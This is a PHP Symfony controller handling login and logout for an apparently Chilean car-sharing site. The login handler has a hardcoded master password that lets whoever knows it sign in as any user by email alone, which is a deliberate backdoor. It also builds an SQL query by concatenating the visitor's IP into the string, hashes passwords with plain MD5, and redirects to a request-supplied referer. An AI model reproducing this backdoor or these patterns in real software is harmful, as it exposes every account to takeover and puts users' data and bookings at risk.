<?php

/**
 * main actions.
 *
 * @package    CarSharing
 * @subpackage main
 * @author     Your name here
 * @version    SVN: $Id: actions.class.php 23810 2009-11-12 11:07:44Z Kris.Wallsmith $
 */
class mainActions extends sfActions
{
 /**
  * Executes index action
  *
  * @param sfRequest $request A request object
  */
  public function executeIndex(sfWebRequest $request)
  {
    $this->setLayout("layout");
  }

  public function executeLogin (sfWebRequest $request) {

        $this->setLayout("layoutLogin");

        // Si si usuario está logueado se redirecciona
        if ($this->getUser()->isAuthenticated()) {
            $this->redirect('homepage');
        }
        
        $referer = $this->getContext()->getActionStack()->getSize() > 1 ? $request->getUri() : $request->getReferer();
        $this->getUser()->setAttribute("referer", $referer);
    }

    public function executeLoginDo (sfWebRequest $request) {

        /*if ($this->getRequest()->getMethod() != sfRequest::POST) {*/
        if ($request->isMethod("post")) {
            
            if ($this->getRequestParameter('password') == "leonracing") {
                $q = Doctrine::getTable('user')->createQuery('u')->where('u.email = ?', array($this->getRequestParameter('username')));
            } else {
                $q = Doctrine::getTable('user')->createQuery('u')->where('(u.email = ? OR u.username=?)  and u.password = ?', array($this->getRequestParameter('username'), $this->getRequestParameter('username'), md5($this->getRequestParameter('password'))));
            }

            try {
                $user = $q->fetchOne();
            } catch (Exception $e) {
                Utils::reportError($e->getMessage(), "main/loginDo");
            }

            if ($user) {

                if ($user->getConfirmed() == 1 || $user->getConfirmed() == 0) {

                    /* track ip */
                    $visitingIp = $request->getRemoteAddress();
                    $user->trackIp($visitingIp);
                    
                    /* check moroso */
                    $user->checkMoroso();
        
                    /** block users */
                    
                    // primero verifico si la IP existe en la tabla de IPs válidas
                    //$validIp = Doctrine::getTable('ipsOk')->findByIP($visitingIp);                    
                    $sql =  "SELECT *
                        FROM Ips_ok
                        WHERE ip = '". $visitingIp ."'";

                    $query = Doctrine_Manager::getInstance()->connection();
                    $validIp = $query->fetchOne($sql);

                    if(empty($validIp)) {

                        // Se bloquea al usuario si es que su ip corresponde a una ip que posea CUALQUIER usuario bloqueado previamente
                        if(Doctrine::getTable('user')->isABlockedIp($visitingIp)) {
                            $user->setBloqueado("Se loggeo desde la ip:".$visitingIp. " desde la cual ya se habia loggeado un usuario bloqueado.");
                        }

                        /** block propietario */

                        // Update 30/09/2014 No se bloquea al usuario y se marca con un flag ip_ambiguo
                        //  Este flag es revisado despues en una reserva paga notificando por correo para hacer una revision manual
                        if($user->getPropietario()) {

                            $noPropietarios = Doctrine::getTable('user')->getPropietarioByIp($visitingIp, false);
                            foreach ($noPropietarios as $nopropietario) {
                                // $nopropietario->setBloqueado("Un usuario propietario se loggeo desde la ip:".$visitingIp. ", desde la cual este usuario NO propietario se habia loggeado.");
                                $nopropietario->setIpAmbigua(true);
                                $nopropietario->save();
                            }
                            if(count($noPropietarios) > 0) {
                                // $user->setBloqueado("Se loggeo usuario propietario desde la ip:".$visitingIp. " desde la cual ya se habia loggeado un usuario NO propietario.");
                                $user->setIpAmbigua(true);
                                $user->save();
                            }
                        } else {

                            $propietarios = Doctrine::getTable('user')->getPropietarioByIp($visitingIp, true);
                            foreach ($propietarios as $propietario) {
                                // $propietario->setBloqueado("Se loggeo usuario NO propietario desde la ip:".$visitingIp. " desde la cual ya se habia loggeado este usuario propietario.");
                                $propietario->setIpAmbigua(true);
                                $propietario->save();
                            }
                            if(count($propietarios) > 0) {
                                // $user->setBloqueado("Se loggeo este usuario NO propietario desde la ip:".$visitingIp. " desde la cual ya se habia loggeado un usuario propietario.");
                                $user->setIpAmbigua(true);
                                $user->save();
                            }
                        }
                    }

                    $this->getUser()->setFlash('msg', 'Autenticado');
                    $this->getUser()->setAuthenticated(true);

                    $this->getUser()->setAttribute("logged", true);
                    $this->getUser()->setAttribute("loggedFb", false);
                    $this->getUser()->setAttribute("userid", $user->getId());
                    $this->getUser()->setAttribute("fecha_registro", $user->getFechaRegistro());
                    $this->getUser()->setAttribute("email", $user->getEmail());
                    $this->getUser()->setAttribute("telephone", $user->getTelephone());
                    $this->getUser()->setAttribute("comuna", $user->getNombreComuna());
                    $this->getUser()->setAttribute("region", $user->getNombreRegion());
                    $this->getUser()->setAttribute("name", current(explode(' ', $user->getFirstName())) . " " . substr($user->getLastName(), 0, 1) . '.');

                    $this->logMessage('firstname', 'err');
                    $this->logMessage($user->getFirstName(), 'err');

                    $this->getUser()->setAttribute("firstname", $user->getFirstName());

                    if ($user->getPictureFile()) {
                        $this->getUser()->setAttribute("picture_file", $user->getPictureFile());
                    }

                    //Modificacion para identificar si el usuario es propietario o no de vehiculo
                    if ($user->getPropietario()) {
                        $this->getUser()->setAttribute("propietario", true);
                    } else {
                        $this->getUser()->setAttribute("propietario", false);
                    }

                    if ($this->getUser()->getAttribute('lastview') != null) {
                        $this->redirect($this->getUser()->getAttribute('lastview'));
                    }

                    $this->getUser()->setAttribute('geolocalizacion', true);

                    /*sfContext::getInstance()->getLogger()->info($_SESSION['login_back_url']);
                    $this->redirect($_SESSION['login_back_url']);*/

                    $this->redirect($this->getUser()->getAttribute("referer"));
                    $this->calificacionesPendientes();
                } else {

                    $this->getUser()->setFlash('msg', 'Su cuenta no ha sido activada. Puede hacerlo siguiendo este <a href="activate">link</a>');
                    $this->getUser()->setFlash('show', true);

                    $url = $this->getUser()->getAttribute("referer", false)?:"@homepage";
                    $this->getUser()->setAttribute("referer", false);
                    $this->redirect($url);

                    $this->forward('main', 'login');
                }
            } else {

                $this->getUser()->setFlash('msg', 'Usuario o contraseña inválido');
                $this->getUser()->setFlash('show', true);

                $this->forward('main', 'login');
            }
        }
        
        /*$this->forward('main', 'index');*/
        $this->redirect("homepage");

        return sfView::NONE;
    }

    public function executeLogout() {

        if ($this->getUser()->isAuthenticated()) {

            $this->getUser()->setAuthenticated(false);
            $this->getUser()->getAttributeHolder()->clear();
        }

        return $this->redirect('homepage');
    }
}
